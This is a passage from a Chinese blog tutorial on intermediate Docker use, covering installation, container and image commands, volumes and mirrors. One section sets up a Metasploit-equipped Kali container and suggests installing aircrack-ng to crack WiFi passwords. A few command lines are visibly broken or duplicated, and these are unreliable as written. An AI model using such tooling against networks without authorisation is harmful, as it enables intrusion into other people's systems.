{"title":"docker进阶-klsday15","uid":"2cea8a27d32f58a50ca371984b6b8f54","slug":"klsday15-docker进阶","date":"2023-06-06T00:50:35.191Z","updated":"2023-06-10T05:04:34.196Z","comments":true,"path":"api/articles/klsday15-docker进阶.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-7ppv3o.jpg","content":"<p>Docker 是基于 Go 语言实现的云开源项目，是基于 Linux 的多项开源技术提供高效、敏捷和轻量级的容器方案。创建于 2013 年初，自从开源后就受到了广泛的关注，从长远的眼光来看，Docker 是未来虚拟化的一个发展的趋势。带来了更轻量快捷的的体验，一台主机可以同时运行数千个 Docker 容器，而且在性能上几乎不会损耗。</p>\n<h2 id=\"Docker简介\"><a href=\"#Docker简介\" class=\"headerlink\" title=\"Docker简介\"></a>Docker简介</h2><h3 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h3><p>Docker 是基于 Go 语言实现的云开源项目，是基于 Linux 的多项开源技术提供高效、敏捷和轻量级的容器方案。创建于 2013 年初。自从开源后就受到了广泛的关注，从长远的眼光来看，Docker 是未来虚拟化的一个发展的趋势。</p>\n<h3 id=\"优势\"><a href=\"#优势\" class=\"headerlink\" title=\"优势\"></a>优势</h3><ol>\n<li>一次构建，处处运行，带来了更快速的交付和部署和更轻松的迁移和扩展。</li>\n<li>对系统内核进行抽象，带来了更轻量快捷的的体验，一台主机可以同时运行数千个 Docker 容器，而且在性能上几乎不会损耗。</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>测试工具</th>\n<th>物理主机</th>\n<th>Docker</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>CPU</td>\n<td>sysbench</td>\n<td>1</td>\n<td>0.9945</td>\n</tr>\n<tr>\n<td>写内存</td>\n<td>sysbench</td>\n<td>1</td>\n<td>0.9826</td>\n</tr>\n<tr>\n<td>读内存</td>\n<td>sysbench</td>\n<td>1</td>\n<td>1.0025</td>\n</tr>\n<tr>\n<td>磁盘 I O</td>\n<td>dd</td>\n<td>1</td>\n<td>0.9811</td>\n</tr>\n<tr>\n<td>网络</td>\n<td>iperf</td>\n<td>1</td>\n<td>0.9626</td>\n</tr>\n</tbody></table>\n<p>从数值上看，物理主机与 Docker 容器之间的性能差异不大，二者速度几乎一样。</p>\n<h3 id=\"基本组件\"><a href=\"#基本组件\" class=\"headerlink\" title=\"基本组件\"></a>基本组件</h3><p><strong>镜像</strong>：镜像是构建 Docker 世界的基石。用户的一切操作都是基于镜像来运行自己的容器的。同时镜像也是 Docke r 的 “构建” 部分，也可以把镜像当作容器的” 源代码”，镜像体积很小，便携性高，易分享、存储和更新。<br><strong>容器</strong>：容器是基于镜像启动起来的，用户只需要把自己的应用程序或服务打包放进容器即可。容器中可以运行一个或多个进程，是 Docker 的启动和执行阶段。</p>\n<h2 id=\"Docker-安装\"><a href=\"#Docker-安装\" class=\"headerlink\" title=\"Docker 安装\"></a>Docker 安装</h2><p>这里我只写 Ubuntu、Kali&#x2F;Debian、CentOS 下的安装。</p>\n<h3 id=\"Ubuntu-x2F-CentOS-安装-Docker\"><a href=\"#Ubuntu-x2F-CentOS-安装-Docker\" class=\"headerlink\" title=\"Ubuntu&#x2F;CentOS 安装 Docker\"></a>Ubuntu&#x2F;CentOS 安装 Docker</h3><p>Ubuntu Linux 系统耳熟能详的操作系统。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">curl -fsSL get.docker.com -o get-docker.sh\nsudo sh get-docker.sh --mirror Aliyun</code></pre>\n\n<p>然后，我们需要向 <code>sources.list</code> 中添加 Docker 软件源</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ echo \\\n  &quot;deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg] https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \\\n  $(lsb_release -cs) stable&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null\n\n\n# 官方源\n# $ echo \\\n#   &quot;deb [arch&#x3D;amd64 signed-by&#x3D;&#x2F;usr&#x2F;share&#x2F;keyrings&#x2F;docker-archive-keyring.gpg] https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;ubuntu \\\n#   $(lsb_release -cs) stable&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.list &gt; &#x2F;dev&#x2F;null</code></pre>\n\n<h2 id=\"Dokcer-入门\"><a href=\"#Dokcer-入门\" class=\"headerlink\" title=\"Dokcer 入门\"></a>Dokcer 入门</h2><h3 id=\"搜索镜像\"><a href=\"#搜索镜像\" class=\"headerlink\" title=\"搜索镜像\"></a>搜索镜像</h3><p>Dokcer 通过 <a href=\"https://hub.docker.com/\">Dokcer Hub</a> 搭建镜像共享生态系统，这意味着我们可以直接下载其他人已经打包好的镜像。<br>使用 docker search 命令在 Docker HUB 中搜索镜像<br>这里我们以搜索 Ubuntu 镜像为例：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker search ubuntu</code></pre>\n\n<p>一般我们下载靠前面的镜像，OFFICIAL 标签如果是 OK 的话，这表示是官方镜像，其他的都是用户自己创建并共享的镜像。</p>\n<h3 id=\"下载镜像\"><a href=\"#下载镜像\" class=\"headerlink\" title=\"下载镜像\"></a>下载镜像</h3><p>下面从 Docker Hub 下载 Ubuntu 镜像，终端输入：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker pull ubuntu</code></pre>\n\n<h3 id=\"列出下载的镜像\"><a href=\"#列出下载的镜像\" class=\"headerlink\" title=\"列出下载的镜像\"></a>列出下载的镜像</h3><p>下面列出本地主机中已经下载的 docker 镜像<br>终端输入：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker images</code></pre>\n\n<p>或者：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker image ls</code></pre>\n\n<h3 id=\"创建并使用容器\"><a href=\"#创建并使用容器\" class=\"headerlink\" title=\"创建并使用容器\"></a>创建并使用容器</h3><p>使用 run 命令即可用镜像来创建一个容器</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker run -i -t --name hellodocker ubuntu &#x2F;bin&#x2F;\n命令格式为：docker run &lt;选项参数&gt;  &lt;镜像名称&gt; &lt;要运行的文件&gt;\n\n&gt;使用 -i、-t选项可以在运行的Bash shell中进行输入与输出\n&gt;使用—name可以指定容器的名称。如果不指定的话，docker默认会自动生成随机的名称进行指定。</code></pre>\n\n<p>再回看这行命令大概就明白了它的意思：使用 ubuntu 这个镜像来创建一个名为 hellodocker 的容器<br>当我们创建容器后，默认就进入了容器，此时使用 cd、ls 等命令发现已经不是我们物理机上的 ubutu 了。</p>\n<h3 id=\"退出容器\"><a href=\"#退出容器\" class=\"headerlink\" title=\"退出容器\"></a>退出容器</h3><p>终端输入:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">exit</code></pre>\n\n<p>从 Bash shell 退出，因为在 Ubuntu 镜像中直接运行 &#x2F;bin&#x2F;bash 可执行文件，所以退出后 容器也会终止（stop），就这样我们创建运行并退出了一个容器，现在自己再亲手创建个容器试试看吧。</p>\n<h3 id=\"查看容器列表\"><a href=\"#查看容器列表\" class=\"headerlink\" title=\"查看容器列表\"></a>查看容器列表</h3><p>终端输入:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker ps -a</code></pre>\n\n<p>查看本地的所有容器的详细信息，可以看到他们的 ID、所使用的镜像、创建时间、端口等信息 。</p>\n<h3 id=\"使用-start-命令来启动容器\"><a href=\"#使用-start-命令来启动容器\" class=\"headerlink\" title=\"使用 start 命令来启动容器\"></a>使用 start 命令来启动容器</h3><p>到这里机智的小伙伴们可能产生疑问了：第一次创建容器是默认就进入了容器，那么在我们 exit 退出容器之后如何唤醒我们的容器呢？ 表急，其实 docker 早已考虑到了这个，我们在终端下输入：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker start hellodocker</code></pre>\n\n<p>来启动名为 hellodocker 的容器，所以启动 docker 容器的命令就是：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker start 容器名</code></pre>\n\n<p>来启动名为 hellodocker 的容器，所以启动 docker 容器的命令就是：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker start 容器名</code></pre>\n\n<h3 id=\"使用-restart-命令来重启容器\"><a href=\"#使用-restart-命令来重启容器\" class=\"headerlink\" title=\"使用 restart 命令来重启容器\"></a>使用 restart 命令来重启容器</h3><p>与重启系统一样，也可以直接使用如下命令来重启某个容器：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker restart hellodocker</code></pre>\n\n<h3 id=\"使用-attach-命令连接容器\"><a href=\"#使用-attach-命令连接容器\" class=\"headerlink\" title=\"使用 attach 命令连接容器\"></a>使用 attach 命令连接容器</h3><p>前面我们 start 了一个容器，但是还是默认不进入容器，我们使用：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker ps -a</code></pre>\n\n<p>来查看容器的运行情况，可以看到 hellodocker 这个容器已经启动了 4 秒多了，说明容器已经在运行了，那么我们怎么来连接启动的 docker 容器呢？终端输入：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker attach hellodocker</code></pre>\n\n<h3 id=\"Docker-系统统计信息\"><a href=\"#Docker-系统统计信息\" class=\"headerlink\" title=\"Docker 系统统计信息\"></a>Docker 系统统计信息</h3><p>终端下输入:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker stats</code></pre>\n\n<p>用来显示一个或多个容器的统计信息，可以看到容器的 ID、CPU 占用率、内存使用率、网速等信息</p>\n<h3 id=\"终止容器\"><a href=\"#终止容器\" class=\"headerlink\" title=\"终止容器\"></a>终止容器</h3><p>要终止容器的话，首先 docker ps -a 列出后台正在运行的容器，然后终端输入：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker stop hellodocker</code></pre>\n\n<p>终止了我们刚启动不久的 hellodocker 容器</p>\n<h3 id=\"删除容器\"><a href=\"#删除容器\" class=\"headerlink\" title=\"删除容器\"></a>删除容器</h3><p>如果容器不再使用可以使用如下命令删除:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker rm hellodocker</code></pre>\n\n<h3 id=\"删除镜像\"><a href=\"#删除镜像\" class=\"headerlink\" title=\"删除镜像\"></a>删除镜像</h3><p>如果镜像不再使用可以使用如下命令删除：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker rmi ubuntu</code></pre>\n\n<h2 id=\"Docker-简约命令\"><a href=\"#Docker-简约命令\" class=\"headerlink\" title=\"Docker 简约命令\"></a>Docker 简约命令</h2><h3 id=\"列出下载的镜像-1\"><a href=\"#列出下载的镜像-1\" class=\"headerlink\" title=\"列出下载的镜像\"></a>列出下载的镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker image ls</code></pre>\n\n<h3 id=\"部署容器\"><a href=\"#部署容器\" class=\"headerlink\" title=\"部署容器\"></a>部署容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker run --name hellodocker -d -p 81:80 ubuntu:18.04</code></pre>\n\n<h3 id=\"创建并使用容器-1\"><a href=\"#创建并使用容器-1\" class=\"headerlink\" title=\"创建并使用容器\"></a>创建并使用容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker run -i -t --name hellodocker ubuntu &#x2F;bin&#x2F;bash</code></pre>\n\n<h3 id=\"查看容器列表-1\"><a href=\"#查看容器列表-1\" class=\"headerlink\" title=\"查看容器列表\"></a>查看容器列表</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker ps -a</code></pre>\n\n<h3 id=\"使用-start-命令来启动容器-1\"><a href=\"#使用-start-命令来启动容器-1\" class=\"headerlink\" title=\"使用 start 命令来启动容器\"></a>使用 start 命令来启动容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker start 容器名</code></pre>\n\n<h3 id=\"使用-restart-命令来重启容器-1\"><a href=\"#使用-restart-命令来重启容器-1\" class=\"headerlink\" title=\"使用 restart 命令来重启容器\"></a>使用 restart 命令来重启容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker restart 容器名</code></pre>\n\n<h3 id=\"使用-attach-命令连接容器-1\"><a href=\"#使用-attach-命令连接容器-1\" class=\"headerlink\" title=\"使用 attach 命令连接容器\"></a>使用 attach 命令连接容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker attach 容器名\ndocker exec -it 容器名 &#x2F;bin&#x2F;docker exec -it 容器名 &#x2F;bin&#x2F;zsh</code></pre>\n\n<h3 id=\"Docker-系统统计信息-1\"><a href=\"#Docker-系统统计信息-1\" class=\"headerlink\" title=\"Docker 系统统计信息\"></a>Docker 系统统计信息</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker stats</code></pre>\n\n<h3 id=\"终止容器-1\"><a href=\"#终止容器-1\" class=\"headerlink\" title=\"终止容器\"></a>终止容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker stop 容器名</code></pre>\n\n<h3 id=\"删除容器-1\"><a href=\"#删除容器-1\" class=\"headerlink\" title=\"删除容器\"></a>删除容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker rm 容器名</code></pre>\n\n<h3 id=\"删除镜像-1\"><a href=\"#删除镜像-1\" class=\"headerlink\" title=\"删除镜像\"></a>删除镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker rmi ubuntu</code></pre>\n\n<h2 id=\"打造属于你自己的-Kali\"><a href=\"#打造属于你自己的-Kali\" class=\"headerlink\" title=\"打造属于你自己的 Kali\"></a>打造属于你自己的 Kali</h2><p>一般我们搞信息安全的难免都会用到 Kali Linux，如果不想安装累赘的虚拟机或者不想折腾更新源等那么该肿么办呢？现在有了 Docker，这一切的问题都不再是问题，使用 Docker 来运行 Kali，更加轻便快捷，而且可以 ping 通物理机的 C 段，用来实战的话再合适不过了。</p>\n<h3 id=\"首先搜索下可用的-Kali-镜像\"><a href=\"#首先搜索下可用的-Kali-镜像\" class=\"headerlink\" title=\"首先搜索下可用的 Kali 镜像\"></a>首先搜索下可用的 Kali 镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker search kali</code></pre>\n\n<p>出来了一大堆，根据名字可以大概判断出第二个镜像是带有 meatsploit 的，所以为了日后配置的方便我们这里直接来下载第二个镜像。</p>\n<h3 id=\"下载-Kali-镜像\"><a href=\"#下载-Kali-镜像\" class=\"headerlink\" title=\"下载 Kali 镜像\"></a>下载 Kali 镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker pull linuxkonsult&#x2F;kali-metasploit</code></pre>\n\n<p>下载带有 msf 的 kali 镜像（镜像不大，我这边下载完不到 10 分钟）</p>\n<h3 id=\"创建-Kali-容器\"><a href=\"#创建-Kali-容器\" class=\"headerlink\" title=\"创建 Kali 容器\"></a>创建 Kali 容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker run -i -t --name  msfkali linuxkonsult&#x2F;kali-metasploit &#x2F;bin&#x2F;bash</code></pre>\n\n<p>用下载的 kali 镜像创建个名为 msfkali 的容器</p>\n<h3 id=\"进入容器查看基本信息\"><a href=\"#进入容器查看基本信息\" class=\"headerlink\" title=\"进入容器查看基本信息\"></a>进入容器查看基本信息</h3><p>可以看到 kali 使用的是默认源，这里我要说一下，kali 2016.X 版本的 kali 使用这个默认官方源就好， 这个默认的官方源会自动选择速度最快的镜像站点来下载。</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ cat &#x2F;etc&#x2F;apt&#x2F;sources.list\ndeb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main contrib non-free\ndeb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main contrib non-free</code></pre>\n\n<p>终端输入:</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">msfconsole</code></pre>\n\n<p>除此之外还带了 nmap、wget、git 等，但是这些工具还不够我们完成一次渗透测试</p>\n<h3 id=\"安装自己需要的工具\"><a href=\"#安装自己需要的工具\" class=\"headerlink\" title=\"安装自己需要的工具\"></a>安装自己需要的工具</h3><p>首先先刷新下更新缓存列表：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">apt update</code></pre>\n\n<p>然后就可以直接安装工具了</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">apt install 工具名</code></pre>\n\n<p>这里你需要什么工具就安装什么工具，速度很快的，用什么就安装什么，没有什么比这个更 DIY 的了。举个例子：你想安装个 aircrack 来破解 WiFi 密码，那么就直接：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">apt-get install aircrack-ng</code></pre>\n\n<p>总之，这个 Kali Docker 就是 Kali 的命令行，和正常是 Kali 一模一样，该怎么折腾就怎么折腾吧。</p>\n<h2 id=\"Docker-优化\"><a href=\"#Docker-优化\" class=\"headerlink\" title=\"Docker 优化\"></a>Docker 优化</h2><h3 id=\"Docker-国内加速器\"><a href=\"#Docker-国内加速器\" class=\"headerlink\" title=\"Docker 国内加速器\"></a>Docker 国内加速器</h3><p>不替换源对话，docker pull 拉去镜像对速度实在太龟速了，如果你很佛系对话可以不进行更换</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"># 编辑这个文件，如果没有对话就创建这个文件\nvim &#x2F;etc&#x2F;docker&#x2F;daemon.json</code></pre>\n\n<p>内容如下：</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\">JSON\n&#123;\n  &quot;registry-mirrors&quot;: [\n    &quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;\n  ]\n&#125;</code></pre>\n\n<p>这里我使用对是国内 163 网易源，其他源可以自行百度替换。<br>配置完成后重启服务才可以生效：</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">sudo systemctl daemon-reload\nsudo systemctl restart docker</code></pre>\n\n<h2 id=\"Docker-基础命令\"><a href=\"#Docker-基础命令\" class=\"headerlink\" title=\"Docker 基础命令\"></a>Docker 基础命令</h2><h3 id=\"搜索镜像-1\"><a href=\"#搜索镜像-1\" class=\"headerlink\" title=\"搜索镜像\"></a>搜索镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker search 关键词</code></pre>\n\n<h3 id=\"下载镜像-1\"><a href=\"#下载镜像-1\" class=\"headerlink\" title=\"下载镜像\"></a>下载镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker pull 镜像名</code></pre>\n\n<h3 id=\"查看已下载的镜像列表\"><a href=\"#查看已下载的镜像列表\" class=\"headerlink\" title=\"查看已下载的镜像列表\"></a>查看已下载的镜像列表</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker image ls</code></pre>\n\n<h3 id=\"创建并使用容器-2\"><a href=\"#创建并使用容器-2\" class=\"headerlink\" title=\"创建并使用容器\"></a>创建并使用容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker run -it --name 容器名 镜像名&#x2F;镜像ID &#x2F;bin&#x2F;bash</code></pre>\n\n<h3 id=\"查看当前容器\"><a href=\"#查看当前容器\" class=\"headerlink\" title=\"查看当前容器\"></a>查看当前容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker ps -a</code></pre>\n\n<h3 id=\"统计信息\"><a href=\"#统计信息\" class=\"headerlink\" title=\"统计信息\"></a>统计信息</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker stats</code></pre>\n\n<h3 id=\"启动容器\"><a href=\"#启动容器\" class=\"headerlink\" title=\"启动容器\"></a>启动容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker start 容器名&#x2F;容器ID</code></pre>\n\n<h3 id=\"重启容器\"><a href=\"#重启容器\" class=\"headerlink\" title=\"重启容器\"></a>重启容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker restart 容器名&#x2F;容器ID</code></pre>\n\n<h3 id=\"终止容器-2\"><a href=\"#终止容器-2\" class=\"headerlink\" title=\"终止容器\"></a>终止容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker stop 容器名&#x2F;容器ID</code></pre>\n\n<h3 id=\"终止所有容器\"><a href=\"#终止所有容器\" class=\"headerlink\" title=\"终止所有容器\"></a>终止所有容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker stop $(docker ps -aq)</code></pre>\n\n<h3 id=\"连接容器\"><a href=\"#连接容器\" class=\"headerlink\" title=\"连接容器\"></a>连接容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker exec -it 容器名&#x2F;容器ID &#x2F;bin&#x2F;bash</code></pre>\n\n<h3 id=\"删除容器-2\"><a href=\"#删除容器-2\" class=\"headerlink\" title=\"删除容器\"></a>删除容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker rm 容器名&#x2F;容器ID</code></pre>\n\n<h3 id=\"删除所有容器\"><a href=\"#删除所有容器\" class=\"headerlink\" title=\"删除所有容器\"></a>删除所有容器</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker rm $(docker ps -aq)</code></pre>\n\n<h3 id=\"删除镜像-2\"><a href=\"#删除镜像-2\" class=\"headerlink\" title=\"删除镜像\"></a>删除镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker rmi 镜像名&#x2F;容器ID</code></pre>\n\n<h3 id=\"删除所有镜像\"><a href=\"#删除所有镜像\" class=\"headerlink\" title=\"删除所有镜像\"></a>删除所有镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker rmi $(docker images -q)</code></pre>\n\n<h3 id=\"端口映射\"><a href=\"#端口映射\" class=\"headerlink\" title=\"端口映射\"></a>端口映射</h3><p>部署一个容器，并将 80 端口映射到宿主机的 8000 端口上</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"># 可以使用--name自定义部署的容器名\ndocker run -d -p 8000:80 --name 容器名 镜像名\n\n# 也可以直接通过镜像部署\ndocker run -d -p 8000:80 镜像名</code></pre>\n\n<h3 id=\"dockerfile-部署镜像\"><a href=\"#dockerfile-部署镜像\" class=\"headerlink\" title=\"dockerfile 部署镜像\"></a>dockerfile 部署镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker build -t 自定义镜像名称 .</code></pre>\n\n<h3 id=\"docker-compose-部署\"><a href=\"#docker-compose-部署\" class=\"headerlink\" title=\"docker-compose 部署\"></a>docker-compose 部署</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker-compose up -d</code></pre>\n\n<h3 id=\"构建新的镜像\"><a href=\"#构建新的镜像\" class=\"headerlink\" title=\"构建新的镜像\"></a>构建新的镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker commit -a &quot;提交的镜像作者&quot; -m &quot;提交时的说明文字&quot; 容器的ID 要创建的新的镜像\ndocker commit -a &quot;1cePeak&quot; -m &quot;wordpress_phpmyadmin&quot; d64655e87ccc wordpress_phpmyadmin:v1</code></pre>\n\n<h3 id=\"保存离线镜像\"><a href=\"#保存离线镜像\" class=\"headerlink\" title=\"保存离线镜像\"></a>保存离线镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker save -o 镜像文件名.tar 要保持的镜像\ndocker save -o wordpress_phpmyadmin.tar wordpress_phpmyadmin:latest</code></pre>\n\n<h3 id=\"导入离线镜像\"><a href=\"#导入离线镜像\" class=\"headerlink\" title=\"导入离线镜像\"></a>导入离线镜像</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">docker load --input 镜像文件名.tar\ndocker load --input wordpress_phpmyadmin.tar</code></pre>\n\n<h3 id=\"数据卷\"><a href=\"#数据卷\" class=\"headerlink\" title=\"数据卷\"></a>数据卷</h3><p><code>数据卷</code> 是一个可供一个或多个容器使用的特殊目录，它绕过 UnionFS，可以提供很多有用的特性：</p>\n<ul>\n<li><code>数据卷</code> 可以在容器之间共享和重用</li>\n<li>对 <code>数据卷</code> 的修改会立马生效</li>\n<li>对 <code>数据卷</code> 的更新，不会影响镜像</li>\n<li><code>数据卷</code> 默认会一直存在，即使容器被删除</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：<code>数据卷</code> 的使用，类似于 Linux 下对目录或文件进行 mount，镜像中的被指定为挂载点的目录中的文件会复制到数据卷中（仅数据卷为空时会复制）。</p></blockquote>\n<h4 id=\"创建一个数据卷\"><a href=\"#创建一个数据卷\" class=\"headerlink\" title=\"创建一个数据卷\"></a>创建一个数据卷</h4><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker volume create my-vol</code></pre>\n\n<p>查看所有的 <code>数据卷</code></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker volume ls\nDRIVER              VOLUME NAME\nlocal               my-vol</code></pre>\n\n<p>在主机里使用以下命令可以查看指定 <code>数据卷</code> 的信息</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">$ docker volume inspect my-vol\n[\n    &#123;\n        &quot;Driver&quot;: &quot;local&quot;,\n        &quot;Labels&quot;: &#123;&#125;,\n        &quot;Mountpoint&quot;: &quot;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;my-vol&#x2F;_data&quot;,\n        &quot;Name&quot;: &quot;my-vol&quot;,\n        &quot;Options&quot;: &#123;&#125;,\n        &quot;Scope&quot;: &quot;local&quot;\n    &#125;\n]</code></pre>\n\n<h4 id=\"启动一个挂载数据卷的容器\"><a href=\"#启动一个挂载数据卷的容器\" class=\"headerlink\" title=\"启动一个挂载数据卷的容器\"></a>启动一个挂载数据卷的容器</h4><p>在用 <code>docker run</code> 命令的时候，使用 <code>--mount</code> 标记来将 <code>数据卷</code> 挂载到容器里。在一次 <code>docker run</code> 中可以挂载多个 